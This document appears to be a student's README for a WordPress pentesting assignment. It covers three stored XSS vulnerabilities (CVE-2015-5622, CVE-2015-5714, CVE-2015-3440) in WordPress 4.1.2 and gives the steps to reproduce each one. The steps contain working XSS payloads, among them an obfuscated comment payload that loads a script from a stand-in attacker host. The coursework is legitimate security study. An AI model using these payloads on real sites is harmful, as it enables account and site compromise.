# Project 7 - WordPress Pentesting

Time spent: **5** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Authenticated Stored Cross-Site Scripting CVE-2015-5622
  - [X] Summary: A stored XSS vulnerability in WordPress allows an user with the posting capability to compromise the website.
    - Vulnerability types: XSS
    - Tested in version: 4.1.2
    - Fixed in version: 4.2.3
  - [X] GIF Walkthrough: 
  - <img src='http://i.imgur.com/HOp9TBq.gif' title='XSS1' width='' alt='XSS1' />
  - [X] Steps to recreate: Log in as a user who can post. Then create a post with this string:
  -     "<a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>"
  -     Then view the post.
  - [X] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/branches/4.1/src/wp-includes/formatting.php)
1. (Required) Authenticated Shortcode Tags Cross-Site Scripting CVE-2015-5714
  - [X] Summary: Allows remote attackers to inject arbitrary web script or HTML by leveraging the mishandling of unclosed HTML elements during processing of shortcode tags.
    - Vulnerability types: XSS
    - Tested in version: 4.1.2
    - Fixed in version: 4.3.1
  - [X] GIF Walkthrough:
  - <img src='http://i.imgur.com/W8qLVaF.gif' title='XSS2' width='' alt='XSS2' />
  - [X] Steps to recreate: Log in as a user who can edit pots. Then edit a post with the string:
  -     "TEST!!![caption width="1" caption='<a href="' ">]</a><a>xxxxxx</a>"
  -     Then go view the post and mouseover the link.
  - [X] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/branches/4.1/src/wp-includes/shortcodes.php)
1. (Required) Unauthenticated Stored Cross-Site Scripting CVE-2015-3440
  - [X] Summary: An unauthenticated attacker can inject JavaScript in WordPress comments. The script is triggered when the comment is viewed.
    - Vulnerability types: XSS
    - Tested in version: 4.1.2
    - Fixed in version: 4.2.1
  - [X] GIF Walkthrough: 
  - <img src='http://i.imgur.com/dlzgOLj.gif' title='XSS3' width='' alt='XSS3' />
  - [X] Steps to recreate: Comment on a post with the following string
  - "<a title='xxx onmouseover=eval(unescape(/var%20a%3Ddocument.createElement%28%27%29%3Ba.setAttribute%28%27src%27%2C%27https%3A%2fattacker.site%2fexploit.js%27%29%3Bdocument.head.appendChild%28a%29/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAA...[64Kb]...A'></a> "
  - [X] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/branches/4.1/src/wp-includes/wp-db.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2017] [Jason Shen]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
